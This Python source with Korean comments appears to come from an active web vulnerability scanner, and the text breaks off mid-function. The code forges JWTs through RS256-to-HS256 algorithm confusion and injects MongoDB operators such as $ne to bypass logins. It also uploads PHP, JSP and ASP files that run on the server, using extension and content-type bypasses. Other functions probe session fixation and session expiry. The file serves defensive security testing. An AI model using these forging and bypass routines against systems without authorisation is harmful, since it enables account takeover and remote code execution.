async def _fetch_jwks_rsa_keys(session, base_url: str) -> list:
    """JWKS 엔드포인트(+OIDC config 의 jwks_uri)에서 RSA 공개키(JWK) 목록 수집."""
    parsed = urllib.parse.urlparse(base_url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    keys, seen = [], set()
    for p in _JWT_JWKS_PATHS:
        url = origin + p
        try:
            st, body, _ = await _get(session, url)
        except Exception:
            continue
        if st != 200 or not body:
            continue
        try:
            d = _json.loads(body)
        except Exception:
            continue
        if isinstance(d, dict) and d.get("jwks_uri"):   # OIDC 디스커버리 → 실제 JWKS
            try:
                st2, b2, _ = await _get(session, d["jwks_uri"])
                d = _json.loads(b2) if st2 == 200 and b2 else {}
            except Exception:
                d = {}
        for k in (d.get("keys") or []) if isinstance(d, dict) else []:
            if isinstance(k, dict) and k.get("kty") == "RSA" and k.get("n") and k.get("e"):
                sig = (k.get("n"), k.get("e"))
                if sig not in seen:
                    seen.add(sig)
                    keys.append(k)
    return keys


def _jwk_rsa_pem_secrets(jwk: dict) -> list:
    """RSA JWK(n,e) → 서버가 HMAC 시크릿으로 쓸 법한 PEM 공개키 후보(바이트) 목록."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization

    def _bi(s):
        s += "=" * (-len(s) % 4)
        return int.from_bytes(base64.urlsafe_b64decode(s), "big")
    try:
        pub = rsa.RSAPublicNumbers(_bi(jwk["e"]), _bi(jwk["n"])).public_key()
    except Exception:
        return []
    try:
        spki = pub.public_bytes(serialization.Encoding.PEM,
                                serialization.PublicFormat.SubjectPublicKeyInfo)
        pkcs1 = pub.public_bytes(serialization.Encoding.PEM,
                                 serialization.PublicFormat.PKCS1)
    except Exception:
        return []
    cands = [spki, spki.rstrip(b"\n"), spki.rstrip(b"\n") + b"\n",
             pkcs1, pkcs1.rstrip(b"\n")]
    out, seen = [], set()
    for c in cands:
        if c not in seen:
            seen.add(c)
            out.append(c)
    return out


def _forge_hs256_with_secret(payload_b64: str, secret: bytes, kid=None) -> str:
    hdr = {"alg": "HS256", "typ": "JWT"}
    if kid:
        hdr["kid"] = kid
    hb = _jwt_b64url(hdr)
    sig = base64.urlsafe_b64encode(
        hmac.new(secret, f"{hb}.{payload_b64}".encode(), hashlib.sha256).digest()
    ).rstrip(b"=").decode()
    return f"{hb}.{payload_b64}.{sig}"


async def _probe_jwt_alg_confusion(session, base_url: str, cookies: list[dict] | None = None,
                                   points: list[dict] | None = None,
                                   scan_id: str = "") -> dict | None:
    """RS256→HS256 alg confusion: JWKS 공개키를 HMAC 시크릿으로 HS256 위조→수락 차등 실증."""
    cands = _jwt_candidates_from_cookies(cookies)
    if not cands:
        return None
    asym = []
    for cname, token in cands:
        parts = token.split(".")
        if len(parts) < 2:
            continue
        try:
            hdr = _json.loads(base64.urlsafe_b64decode(parts[0] + "=="))
        except Exception:
            continue
        alg = str(hdr.get("alg", "")).upper()
        if alg.startswith("RS") or alg.startswith("PS"):   # RSA 계열만(공개키 오용 대상)
            asym.append((cname, token, parts[1], hdr.get("kid")))
    if not asym:
        return None
    jwks = await _fetch_jwks_rsa_keys(session, base_url)
    if not jwks:
        return None
    for cname, token, payload_b64, tok_kid in asym:
        forged = []
        for jwk in jwks:
            for secret in _jwk_rsa_pem_secrets(jwk):
                forged.append(_forge_hs256_with_secret(payload_b64, secret, kid=jwk.get("kid") or tok_kid))
                forged.append(_forge_hs256_with_secret(payload_b64, secret, kid=None))
        if not forged:
            continue
        r = await _jwt_confirm_forgery(base_url, cname, token, forged, points)
        if r:
            return {
                "type": "jwt_alg_confusion", "confirmed": True, "url": r["url"],
                "param": cname, "method": "GET", "cwe_hint": "CWE-347",
                "evidence": (f"JWT alg confusion(RS256→HS256): '{r['url']}' 에 JWKS 공개키를 HMAC "
                             f"시크릿으로 서명한 HS256 위조 토큰을 쿠키 '{cname}' 로 재전송 시 유효 토큰과 "
                             f"동일한 인증 응답(HTTP {r['status_forged']}) — 잘못된 서명은 거부"
                             f"(HTTP {r['status_bad']}). 서버가 헤더 alg 를 신뢰해 공개키로 HS256 검증→서명 위조."),
                "affected_endpoints": [r["url"]],
            }
    return None


# ── 세션 고정(Session Fixation) 능동 실증 ─────────────────────────────────────────
# 로그인 자격증명(AUTH_*)이 설정된 경우에만 동작. 실제 로그인 전후 세션 ID 회전을 비교해
# 미회전(고정)을 실증한다. 스캔당 1회만 수행(로그인 반복/계정 잠금 방지).
_SESSION_FIX_DONE: set = set()


async def _probe_weak_session_id(session, base_url: str, discovered_urls: list | None = None,
                                 scan_id: str = "", points: list | None = None) -> dict | None:
    """약한(예측 가능) 세션 식별자 — 세션 토큰을 여러 번 발급받아 '순차 증가/저엔트로피'면 확증.
    읽기 전용·비파괴(정상 요청만). 예: DVWA weak_id 의 dvwaSession=1,2,3 순차 증가.

    URL 소스는 discovered_urls + 폼 포인트(points) — 활성 프로브 시점에 인증영역 URL 이 아직
    discovered_urls 에 안 실렸을 수 있어(반복 재크롤 이후) points 도 함께 본다."""
    import math
    from collections import Counter
    _cands = (list(discovered_urls or [])
              + [pt.get("url", "") for pt in (points or []) if isinstance(pt, dict)]
              + get_auth_urls(scan_id))   # 인증 크롤 전체 페이지(누락 보정)
    _urls = [base_url]
    for u in _cands:
        _u = u if isinstance(u, str) else u.get("url", "")
        if _u and re.search(r'(weak|session|sess|token)', _u, re.IGNORECASE):
            _urls.append(_u)
    _urls = list(dict.fromkeys([u for u in _urls if u]))[:10]
    _axc = get_auth_cookies(scan_id) or []
    _sess_re = re.compile(r'(session|sess|sid|token|auth)', re.IGNORECASE)

    def _ent(s):
        if not s:
            return 0.0
        n = len(s)
        return -sum((c / n) * math.log2(c / n) for c in Counter(s).values())

    for url in _urls:
        seq = []
        try:
            jar = aiohttp.CookieJar(unsafe=True)
            async with aiohttp.ClientSession(connector=_ssl_connector(), cookie_jar=jar) as fs:
                for c in _axc:
                    try:
                        fs.cookie_jar.update_cookies({c["name"]: c["value"]})
                    except Exception:
                        pass
                for _ in range(6):
                    try:
                        await _get(fs, url)
                        await _post(fs, url, data={})   # 일부 엔드포인트는 POST 로 새 토큰 발급
                    except Exception:
                        pass
                    for c in fs.cookie_jar:
                        if _sess_re.search(c.key) and c.key.lower() != "phpsessid" and c.value:
                            if not seq or seq[-1] != (c.key, c.value):
                                seq.append((c.key, c.value))
        except Exception:
            continue
        if len(seq) < 3:
            continue
        cname = seq[-1][0]
        vals = [v for (k, v) in seq if k == cname][-6:]
        if len(vals) < 3:
            continue
        _digit = all(v.isdigit() for v in vals)
        _seq_inc = _digit and all((int(vals[i + 1]) - int(vals[i])) == 1 for i in range(len(vals) - 1))
        _low_ent = all(len(v) <= 8 for v in vals) and _ent("".join(vals)) < 3.0
        if _seq_inc or (_digit and _low_ent):
            reason = "순차 증가(다음 값 예측 가능)" if _seq_inc else "짧고 저엔트로피(추측 가능)"
            return {
                "type": "weak_session_id", "confirmed": True, "url": url,
                "cookie_name": cname, "samples": vals,
                "evidence": (f"세션 식별자 '{cname}' 가 {reason} — 연속 발급값: {', '.join(vals)}. "
                             f"공격자가 다음/타인의 세션 값을 예측해 세션을 도용(하이재킹)할 수 있음."),
            }
    return None


async def _probe_session_fixation(base_url: str, scan_id: str = "") -> dict | None:
    """AUTH_* 자격증명이 있으면 로그인 전후 세션 ID 회전을 비교해 세션 고정을 실증."""
    key = str(scan_id)
    if key in _SESSION_FIX_DONE:
        return None
    try:
        import probe_policy as _pp
        raw = _pp.auth_crawl_config()
    except Exception:
        return None
    if not (raw.get("enabled") and raw.get("login_url")
            and raw.get("username") and raw.get("password")):
        return None
    _SESSION_FIX_DONE.add(key)
    cfg = types.SimpleNamespace(
        enable_auth_scan=True,
        auth_login_url=raw.get("login_url", ""),
        auth_username=raw.get("username", ""),
        auth_password=raw.get("password", ""),
        auth_username_field="auto", auth_password_field="auto",
        auth_success_pattern=raw.get("success_pattern") or "auto",
        request_timeout=8.0,
    )
    try:
        import authenticated_scan as _as
        r = await _as.detect_session_fixation(cfg, base_url)
    except ScanInterrupted:
        raise
    except Exception:
        return None
    if r and r.get("confirmed"):
        names = ", ".join(r.get("cookie_names", []))
        return {
            "type": "session_fixation", "confirmed": True, "url": r.get("login_url", base_url),
            "param": names, "method": "POST", "cwe_hint": "CWE-384",
            "evidence": (f"세션 고정: 로그인 성공 후에도 세션 쿠키('{names}')가 로그인 전 익명 값과 "
                         f"동일 — 서버가 인증 시 세션 ID 를 재발급(회전)하지 않음. 공격자가 피해자에게 "
                         f"고정시킨 세션 ID 가 그대로 인증 세션이 되어 계정 탈취(하이재킹) 가능."),
            "affected_endpoints": [r.get("login_url", base_url)],
        }
    return None


# ── 세션 만료/로그아웃 무효화 검증(CWE-613) 능동 실증 ─────────────────────────────────
_LOGOUT_INVAL_DONE: set = set()


async def _probe_logout_invalidation(base_url: str, scan_id: str = "") -> dict | None:
    """AUTH_* 자격증명이 있으면 로그아웃 후 옛 세션 토큰 재사용 가능 여부를 실증(CWE-613)."""
    key = str(scan_id)
    if key in _LOGOUT_INVAL_DONE:
        return None
    try:
        import probe_policy as _pp
        raw = _pp.auth_crawl_config()
    except Exception:
        return None
    if not (raw.get("enabled") and raw.get("login_url")
            and raw.get("username") and raw.get("password")):
        return None
    _LOGOUT_INVAL_DONE.add(key)
    cfg = types.SimpleNamespace(
        enable_auth_scan=True,
        auth_login_url=raw.get("login_url", ""),
        auth_username=raw.get("username", ""),
        auth_password=raw.get("password", ""),
        auth_username_field="auto", auth_password_field="auto",
        auth_success_pattern=raw.get("success_pattern") or "auto",
        request_timeout=8.0,
    )
    try:
        import authenticated_scan as _as
        r = await _as.detect_logout_invalidation(cfg, base_url)
    except ScanInterrupted:
        raise
    except Exception:
        return None
    if r and r.get("confirmed"):
        names = ", ".join(r.get("cookie_names", []))
        return {
            "type": "logout_invalidation", "confirmed": True, "url": r.get("url", base_url),
            "param": names, "method": "GET", "cwe_hint": "CWE-613",
            "evidence": (f"로그아웃 무효화 실패: 로그아웃({r.get('logout_url','')}) 실행 후에도 옛 세션 "
                         f"토큰('{names}')을 재전송하면 여전히 인증 응답을 반환 — 서버가 세션을 서버측에서 "
                         f"만료/무효화하지 않고 클라이언트 쿠키만 삭제. 탈취/기록된 옛 토큰이 계속 유효."),
            "affected_endpoints": [r.get("url", base_url)],
        }
    return None


# ── 유휴 세션 타임아웃 검증(CWE-613) — opt-in(SESSION_IDLE_WAIT_SEC>0) ────────────────
_SESSION_IDLE_DONE: set = set()


async def _probe_session_idle_timeout(base_url: str, scan_id: str = "") -> dict | None:
    """AUTH_* 자격증명 + SESSION_IDLE_WAIT_SEC>0 이면 유휴 대기 후 세션 유효 여부를 실증."""
    key = str(scan_id)
    if key in _SESSION_IDLE_DONE:
        return None
    if int(os.getenv("SESSION_IDLE_WAIT_SEC", "0") or 0) <= 0:
        return None
    try:
        import probe_policy as _pp
        raw = _pp.auth_crawl_config()
    except Exception:
        return None
    if not (raw.get("enabled") and raw.get("login_url")
            and raw.get("username") and raw.get("password")):
        return None
    _SESSION_IDLE_DONE.add(key)
    cfg = types.SimpleNamespace(
        enable_auth_scan=True, auth_login_url=raw.get("login_url", ""),
        auth_username=raw.get("username", ""), auth_password=raw.get("password", ""),
        auth_username_field="auto", auth_password_field="auto",
        auth_success_pattern=raw.get("success_pattern") or "auto", request_timeout=8.0,
    )
    try:
        import authenticated_scan as _as
        r = await _as.detect_idle_session_timeout(cfg, base_url)
    except ScanInterrupted:
        raise
    except Exception:
        return None
    if not (r and r.get("confirmed")):
        return None
    _w = int(r.get("wait_sec") or 0)
    names = ", ".join(r.get("cookie_names", []))
    return {
        "type": "session_idle_timeout", "confirmed": True, "url": r.get("url", base_url),
        "param": names, "method": "GET", "cwe_hint": "CWE-613",
        "evidence": (f"유휴 세션 만료 미흡: 로그인 후 {_w}초({_w // 60}분) 동안 아무 요청 없이 대기한 뒤 "
                     f"같은 세션 토큰('{names}')을 재전송해도 여전히 인증됨 — 유휴 세션 만료가 {_w}초보다 "
                     f"길거나 부재. 탈취/방치된 세션의 재사용 창이 큼."),
        "affected_endpoints": [r.get("url", base_url)],
    }


# ── 세션 절대 수명(타임아웃) 검증(CWE-613) ─────────────────────────────────────────
_SESSION_TIMEOUT_DONE: set = set()


async def _probe_session_timeout(base_url: str, scan_id: str = "") -> dict | None:
    """AUTH_* 자격증명이 있으면 인증 세션 토큰의 절대 수명(과도/부재)을 실증."""
    key = str(scan_id)
    if key in _SESSION_TIMEOUT_DONE:
        return None
    try:
        import probe_policy as _pp
        raw = _pp.auth_crawl_config()
    except Exception:
        return None
    if not (raw.get("enabled") and raw.get("login_url")
            and raw.get("username") and raw.get("password")):
        return None
    _SESSION_TIMEOUT_DONE.add(key)
    cfg = types.SimpleNamespace(
        enable_auth_scan=True,
        auth_login_url=raw.get("login_url", ""),
        auth_username=raw.get("username", ""),
        auth_password=raw.get("password", ""),
        auth_username_field="auto", auth_password_field="auto",
        auth_success_pattern=raw.get("success_pattern") or "auto",
        request_timeout=8.0,
    )
    try:
        import authenticated_scan as _as
        r = await _as.detect_session_timeout_weakness(cfg, base_url)
    except ScanInterrupted:
        raise
    except Exception:
        return None
    if not (r and r.get("confirmed")):
        return None
    kind = r.get("kind")
    ck = r.get("cookie", "")
    if kind == "jwt_no_exp":
        ev = (f"세션 절대 만료 부재: 인증 세션 JWT('{ck}')에 만료(exp) 클레임이 없음 — 토큰이 "
              f"영구 유효. 탈취 시 무기한 재사용 가능(절대 세션 타임아웃 부재).")
    elif kind == "jwt_excessive":
        ev = (f"과도한 세션 절대 수명: 인증 세션 JWT('{ck}') 유효기간 약 {r.get('hours')}시간 — 권장 "
              f"임계(기본 24h) 초과. 탈취 토큰의 재사용 창이 지나치게 김.")
    else:  # cookie_excessive
        ev = (f"과도한 세션 쿠키 수명: 인증 세션 쿠키('{ck}') 절대 수명 약 {r.get('days')}일 — 권장 "
              f"임계(기본 30일) 초과. 영속 쿠키로 세션이 과도하게 오래 유지됨.")
    return {
        "type": "session_timeout", "confirmed": True, "url": base_url,
        "param": ck, "method": "GET", "cwe_hint": "CWE-613",
        "evidence": ev, "affected_endpoints": [base_url],
    }


# ── NS: NoSQL 인젝션 ──────────────────────────────────────────────────────────

_NOSQL_LOGIN_KEYS = {"username", "user", "email", "login", "password", "pass", "passwd", "id"}
# JSON 본문 연산자 후보(로그인 우회 계열)
_NOSQL_JSON_OPS = [
    ("$ne", "impossible_eoseureum_xyz_99999", "mongodb_ne_operator"),
    ("$gt", "", "mongodb_gt_operator"),
    ("$regex", ".*", "mongodb_regex_operator"),
]


async def _probe_nosql(session, points: list[dict]) -> dict | None:
    """NoSQL 인젝션(MongoDB 계열 연산자 주입).

    (a) 로그인 폼: JSON 본문에 $ne/$gt/$regex 연산자 주입 → 인증 우회 신호(응답 차이).
    (b) 일반 파라미터: 쿼리 브래킷 주입(param[$ne]=)으로 연산자 해석 여부 판정
        (정상 리터럴·대조군[$eq 불가능값] 대비 차이로 오탐 억제).
    """
    import deep_detect as _dd

    # (a) 로그인 폼 — JSON 연산자 주입
    for pt in _pts_cap(points):
        if pt.get("method") != "POST" or pt.get("source") not in _FORM_SOURCES:
            continue
        if not (set(k.lower() for k in pt["params"]) & _NOSQL_LOGIN_KEYS):
            continue
        _, body_normal, _ = await _post(session, pt["url"], data=pt["params"])
        normal_len = len(body_normal) if body_normal else 0
        # 대조군: 항상 거짓인 리터럴로 로그인 시도(성공/실패 기준선)
        _ctrl = {**pt["params"]}
        for k in list(_ctrl):
            if k.lower() in _NOSQL_LOGIN_KEYS and "pass" in k.lower():
                _ctrl[k] = "eoseureum_wrong_pw_zzz_00000"
        _, body_ctrl, _ = await _post(session, pt["url"], data=_ctrl)
        ctrl_len = len(body_ctrl) if body_ctrl else None

        # 주입 대상: username 필드(원본 유지) + password 필드(username 을 흔한 계정 admin 으로 고정).
        # 표준 MongoDB 인증우회 {username:"admin", password:{$ne:null}} 를 커버(기존엔 password 미주입).
        _user_keys = [k for k in pt["params"]
                      if k.lower() in _NOSQL_LOGIN_KEYS and "pass" not in k.lower()]
        _pass_keys = [k for k in pt["params"]
                      if k.lower() in _NOSQL_LOGIN_KEYS and "pass" in k.lower()]
        _inj_targets = [(k, {**pt["params"]}) for k in _user_keys]
        for _pk in _pass_keys:
            _base = {**pt["params"]}
            for _uk in _user_keys:
                _base[_uk] = "admin"
            _inj_targets.append((_pk, _base))
        for param, _base_params in _inj_targets:
            for op, val, otype in _NOSQL_JSON_OPS:
                nosql_params = {**_base_params, param: {op: val}}
                try:
                    _, body_inj, _ = await _post(session, pt["url"], json=nosql_params)
                except Exception:
                    continue
                inj_len = len(body_inj) if body_inj else 0
                if body_inj and _dd.judge_nosql_operator(normal_len, inj_len, ctrl_len):
                    # 실증 확증(prove-or-drop): $ne(참) vs $eq(거짓) 불린 차등 — 연산자가 실제 해석되면
                    # 두 응답이 결정적으로 다르다. 비-Mongo 앱은 둘 다 미지 연산자로 무시 → 동일 →
                    # 응답차이는 노이즈이므로 폐기(양호). Mongo 오류 시그니처가 있으면 그 자체가 확정.
                    try:
                        _eq_params = {**_base_params, param: {"$eq": val}}
                        _, body_eq, _ = await _post(session, pt["url"], json=_eq_params)
                        _eq_len = len(body_eq) if body_eq else 0
                    except Exception:
                        _eq_len = None
                    _flip = (_eq_len is not None and abs(inj_len - _eq_len) >= 150)
                    _sig = _dd.mongo_signature(body_inj)
                    if not (_flip or _sig):
                        continue   # 불린 차등·Mongo 오류 없음 → 실증 실패 → 폐기(양호), 참고에도 안 남김
                    _corr = (f"Mongo 시그니처 '{_sig}' 노출" if _sig
                             else f"$eq(거짓) 대비 {abs(inj_len - (_eq_len or 0))}바이트 차이 — 연산자 실제 해석")
                    return {
                        "param": param, "payload": f'{{"{op}": "{val}"}}',
                        "url": pt["url"], "type": otype,
                        "response_diff_bytes": abs(inj_len - normal_len),
                        "confirmed": True, "nosql_confirmed": True,
                        "evidence": (f"NoSQL 인젝션 실증: MongoDB {op} 연산자가 '{param}'에서 실제 해석됨 — "
                                     f"$ne(참) 응답이 정상 대비 {abs(inj_len - normal_len)}바이트 차이. "
                                     f"확증: {_corr}. (연산자 주입 확정)"),
                    }

    # (b) 일반 파라미터 — 쿼리 브래킷 연산자 주입
    for pt in [p for p in points if p.get("params")][:8]:
        for param in list(pt["params"])[:4]:
            if "pass" in param.lower():
                continue
            base_params = {**pt["params"]}
            try:
                if pt.get("method") == "POST":
                    _, body_base, _ = await _post(session, pt["url"], data=base_params)
                else:
                    _, body_base, _ = await _get(
                        session, pt["url"] + "?" + urllib.parse.urlencode(base_params))
            except Exception:
                continue
            base_len = len(body_base) if body_base else 0
            # 음성 대조: 같은 불가능값을 '리터럴'(브래킷 없이)로 전송 → 연산자 미해석 기준선.
            # $ne(참) 응답이 정상과도, 이 리터럴 대조와도 달라야 '연산자 해석'으로 인정(동적콘텐츠 오탐 억제).
            _ctrl_len = None
            try:
                cp = {**base_params, param: "impossible_eoseureum_xyz_99999"}
                if pt.get("method") == "POST":
                    _, body_ctrl, _ = await _post(session, pt["url"], data=cp)
                else:
                    _, body_ctrl, _ = await _get(
                        session, pt["url"] + "?" + urllib.parse.urlencode(cp))
                _ctrl_len = len(body_ctrl) if body_ctrl else 0
            except Exception:
                _ctrl_len = None
            # 브래킷 연산자 flip 대조: 항상-거짓 연산자($eq=불가능값)를 같은 브래킷 형식으로 전송.
            # 실제로 연산자가 해석되면 $ne(참)와 $eq(거짓) 응답이 크게 달라야 한다. 비-Mongo 앱은
            # param[$ne]/param[$eq] 둘 다 '미지 파라미터'로 무시 → 응답이 사실상 동일(오탐 억제 핵심).
            _eq_len = None
            try:
                ep = {k: v for k, v in base_params.items() if k != param}
                ep[f"{param}[$eq]"] = "impossible_eoseureum_xyz_99999"
                if pt.get("method") == "POST":
                    _, body_eq, _ = await _post(session, pt["url"], data=ep)
                else:
                    _, body_eq, _ = await _get(
                        session, pt["url"] + "?" + urllib.parse.urlencode(ep))
                _eq_len = len(body_eq) if body_eq else 0
            except Exception:
                _eq_len = None
            for bkey, bval in _dd.nosql_bracket_params(param):
                bp = {k: v for k, v in base_params.items() if k != param}
                bp[bkey] = bval
                try:
                    if pt.get("method") == "POST":
                        _, body_b, _ = await _post(session, pt["url"], data=bp)
                    else:
                        _, body_b, _ = await _get(
                            session, pt["url"] + "?" + urllib.parse.urlencode(bp))
                except Exception:
                    continue
                b_len = len(body_b) if body_b else 0
                if not (body_b and _dd.judge_nosql_operator(base_len, b_len, _ctrl_len, threshold=150)):
                    continue
                # 증거 강화: 응답크기 차이만으로는 부족하다. 아래 중 하나가 있어야 '연산자 해석'으로 인정한다.
                #   (1) Mongo 드라이버/DB 오류 시그니처가 응답에 존재(강한 양성)
                #   (2) 연산자 flip: $ne(참) 응답이 $eq(거짓) 브래킷 응답과도 threshold 이상 차이
                # 둘 다 없으면 단순히 미지 파라미터로 인한 응답 변화(비-Mongo 오탐) → 참고에서도 제외.
                _sig = _dd.mongo_signature(body_b)
                _op_flip = (_eq_len is not None and abs(b_len - _eq_len) >= 150)
                if not (_sig or _op_flip):
                    continue
                if _sig:
                    _corr = f"Mongo 드라이버/DB 오류 시그니처 '{_sig}' 응답에 노출"
                else:
                    _corr = (f"$ne(참) 응답이 $eq(거짓, 동일 브래킷 형식) 대비 "
                             f"{abs(b_len - _eq_len)}바이트 차이 — 연산자 의미가 실제로 반영됨")
                return {
                    "param": param, "payload": f"{bkey}={bval}",
                    "url": pt["url"], "type": "mongodb_bracket_operator",
                    "response_diff_bytes": abs(b_len - base_len),
                    "confirmed": True, "nosql_confirmed": True,   # 강증거(Mongo오류 OR $ne/$eq 불린 flip)만 통과 → 실증
                    "evidence": (
                        f"NoSQL 연산자 주입 실증(음성 대조 차등): '{bkey}={bval}'($ne=참) 응답이 "
                        f"정상 대비 {abs(b_len - base_len)}바이트, 리터럴 대조('{param}=impossible', 거짓) 대비 "
                        f"{abs(b_len - (_ctrl_len if _ctrl_len is not None else base_len))}바이트 차이. "
                        f"확증: {_corr}. (연산자 주입 확정)"),
                }
    return None


# ── FU: 파일 업로드 취약점 ────────────────────────────────────────────────────

def _upload_exec_attempts(marker: str, stem: str, proof: bool) -> list[dict]:
    """업로드 실행-실증용 시도 목록(P6).

    핵심(오탐 교정): '실행 결과 ≠ 원문' 이 되도록 산술식(6*7)을 마커로 감싼다.
    실행되면 'MK42MK', 정적 서빙(text/plain)되면 'MK<?php…MK'(원문) 이 나오므로 둘을 구별한다.
    (기존 코드는 echo 'UPLOAD_TEST_OK' 를 썼는데, 이 문자열은 원문에도 있어 정적 서빙을 실행으로
    오판할 수 있었다 — 차등식으로 해소.) 셸/웹쉘 없음: echo/inline 표현식만 사용.
    proof=True 면 확장자·우회 변형을 확대한다(더 집요).
    """
    # 자기삭제(원상복구): PHP 페이로드는 실행되면 결과 출력 '후' 자기 자신만 삭제(@unlink(__FILE__)).
    # → 되받아 실행(증명)하는 그 순간 업로드 흔적이 서버에서 사라져 원상복구된다. 파괴적 명령이
    #   아니라 '자신이 만든 파일만' 지우는 정리 동작이며, echo 가 먼저라 실행 증명(MK42MK)은 유지된다.
    #   JSP/ASP 는 엔진별 자기삭제가 취약(오동작 위험)해 echo 만 두고, 이후 HTTP 정리·미복구 보고로 처리.
    # 실행 결과를 '사람이 바로 알아볼 수 있는 문구 + 산술 계산값' 으로 출력한다.
    #  - 문구(It_Was_Executed_By_Eoseureum): 우연히 존재할 수 없는 고유 문자열 → 실행됐음이 한눈에.
    #  - =(6*7): 산술식을 서버가 '계산'해 42 로 출력 → 정적 서빙(원문 "(6*7)" 노출)과 결정적으로 구별.
    #    즉 화면에 'It_Was_Executed_By_Eoseureum=42' 가 보이면 = 코드가 실제 실행된 것.
    _phrase = "It_Was_Executed_By_Eoseureum"
    php_expr = f'{marker}<?php echo "{_phrase}=".(6*7); @unlink(__FILE__); ?>{marker}'.encode()
    jsp_expr = f'{marker}<%= "{_phrase}="+(6*7) %>{marker}'.encode()
    asp_expr = f'{marker}<%="{_phrase}="&(6*7)%>{marker}'.encode()
    executed = f"{marker}{_phrase}=42{marker}"
    base = [
        {"ext": ".php", "content": php_expr, "engine": "PHP", "raw": "<?php", "self_cleanup": True},
        {"ext": ".jsp", "content": jsp_expr, "engine": "JSP", "raw": "<%", "self_cleanup": False},
        {"ext": ".asp", "content": asp_expr, "engine": "ASP", "raw": "<%", "self_cleanup": False},
    ]
    if proof:
        base += [
            {"ext": ".phtml", "content": php_expr, "engine": "PHP(phtml)", "raw": "<?php", "self_cleanup": True},
            {"ext": ".php5", "content": php_expr, "engine": "PHP5", "raw": "<?php", "self_cleanup": True},
            {"ext": ".pHp", "content": php_expr, "engine": "PHP(대소문자우회)", "raw": "<?php", "self_cleanup": True},
            {"ext": ".aspx", "content": asp_expr, "engine": "ASPX", "raw": "<%", "self_cleanup": False},
        ]
    for a in base:
        a["executed"] = executed
        a["filename"] = f"{stem}{a['ext']}"
    return base


def _find_uploaded_url(base_url: str, filename: str, stem: str,
                       hdrs: dict, body_resp: str) -> str | None:
    """업로드 응답에서 저장된 파일 URL 을 찾는다: Location 헤더 → 응답 본문 내 경로/URL."""
    loc = (hdrs or {}).get("Location", "")
    if loc and (stem in loc or filename in loc):
        return _resolve_url(base_url, loc)
    if not body_resp:
        return None
    # 본문에서 파일명(또는 stem) 을 포함한 URL/경로 추출
    m = re.search(r'([^\s"\'<>()]*' + re.escape(stem) + r'[^\s"\'<>()]*)', body_resp)
    if m:
        cand = m.group(1)
        # 경로 조각만 잡혔으면(확장자 없이) filename 으로 보정
        if stem in cand and "." not in cand.rsplit("/", 1)[-1]:
            cand = cand.rstrip("/") + "/" + filename
        return _resolve_url(base_url, cand)
    return None


async def _probe_file_upload(session, base_url: str, points: list[dict],
                             scan_id: str = "") -> dict | None:
    """파일 업로드: 위험 확장자 허용 폼 검출 + 업로드→실행 '차등' 실증(P6).

    실행 확증(CRITICAL): 업로드한 스크립트를 되받아(fetch-back) '실행 결과(MK42MK)' 가 나오고
    '원문 소스(<?php/<%)' 는 나오지 않을 때만 code_execution 확정 — 정적 서빙 오탐 배제.
    PROOF 모드에서 확장자/우회 변형을 확대한다. 실행 확증 실패 시엔 '무제한 업로드 폼'(참고)로만 보고.
    """
    import validation_profiles as _vp
    try:
        _proof = _vp.proof_active()
    except Exception:
        _proof = False

    upload_re = re.compile(r'<input[^>]+type=["\']file["\']', re.IGNORECASE)
    accept_restrict_re = re.compile(
        r'accept=["\'][^"\']*\.(jpg|jpeg|png|gif|pdf|doc|xls)', re.IGNORECASE
    )
    import aiohttp as _ah
    marker = "EOSUP" + secrets.token_hex(3).upper()
    stem = "eosup" + secrets.token_hex(3)
    attempts = _upload_exec_attempts(marker, stem, _proof)

    unrestricted_form = None  # 실행 확증은 못했지만 무제한 업로드로 확인된 폼(폴백 보고)
    _uploaded_files: list[dict] = []  # 원상복구 추적: 업로드한 모든 파일(정적서빙 등 자기삭제 미발동분 포함)

    for pt in points:
        if pt.get("source") not in _FORM_SOURCES:
            continue
        _, body, _ = await _get(session, pt["url"])
        if not body or not upload_re.search(body):
            continue
        if "multipart/form-data" not in body.lower():
            continue
        is_restricted = bool(accept_restrict_re.search(body))
        if is_restricted:
            continue  # accept 로 위험 확장자 차단 — 별도 우회 시도는 PROOF 확장 대상(현재는 스킵)

        # 파일 input 의 실제 name 속성을 폼에서 파싱한다(DVWA 는 'uploaded', 앱마다 다름).
        # 하드코딩 'file' 이면 서버가 $_FILES['uploaded'] 를 못 찾아 업로드 거부 → 오탐 누락.
        file_field = "file"
        _fm = re.search(r'<input[^>]*type=["\']file["\'][^>]*>', body, re.IGNORECASE)
        if _fm:
            _nm = re.search(r'name=["\']([^"\']+)["\']', _fm.group(0))
            if _nm:
                file_field = _nm.group(1)

        for att in attempts:
            data = _ah.FormData()
            data.add_field(file_field, att["content"], filename=att["filename"],
                           content_type="image/jpeg")  # content-type 우회 시도
            for k, v in pt["params"].items():
                if k != file_field:
                    data.add_field(k, str(v))
            status, body_resp, hdrs = await _post(
                session, pt["url"], data=data, headers={"User-Agent": _SCANNER_UA})
            if status not in (200, 201, 302):
                continue
            if unrestricted_form is None:
                unrestricted_form = {
                    "url": pt["url"],
                    "issue": "파일 타입 제한 없는 업로드 폼",
                    "details": "accept 속성 없음 — .php, .jsp 등 위험 확장자 업로드 허용",
                    "upload_response": status,
                    "confirmed": False,
                    "evidence": f"위험 확장자({att['ext']}) 업로드 → HTTP {status} 응답",
                }
            # 상대경로(../../hackable/uploads/..)는 폼 페이지(pt["url"]) 기준으로 해석해야 정확.
            up_url = _find_uploaded_url(pt["url"], att["filename"], stem, hdrs, body_resp)
            if not up_url:
                continue
            _uploaded_files.append({"filename": att["filename"], "up_url": up_url,
                                    "self_cleanup": bool(att.get("self_cleanup"))})
            # 되받기는 반드시 '신선한' 요청이어야 한다(스캐너 응답캐시 우회) — 업로드 전 404 캐시를
            # 재사용하면 실행 확증이 실패하고, 자기삭제(@unlink)도 실제로 발동하지 않는다.
            _, fetched, _ = await _get(session, up_url, headers={"User-Agent": _SCANNER_UA})
            if not fetched:
                continue
            # 차등 실행 판정: 실행 결과 존재 + 원문 소스 미노출 → 코드 실행 확정
            if att["executed"] in fetched and att["raw"] not in fetched:
                # 원상복구(정리): PHP 자기삭제 페이로드는 방금 되받아 실행한 순간 @unlink(__FILE__)
                # 로 자신을 삭제했다. 재확인 GET 으로 실제 삭제 여부를 검증해 정직하게 기록한다.
                # (자기삭제 불가 엔진이거나 삭제 실패면 남은 파일을 보고서에 '미복구'로 명시)
                cleanup_attempted = bool(att.get("self_cleanup"))
                cleanup_success = False
                cleanup_detail = ""
                if cleanup_attempted:
                    try:
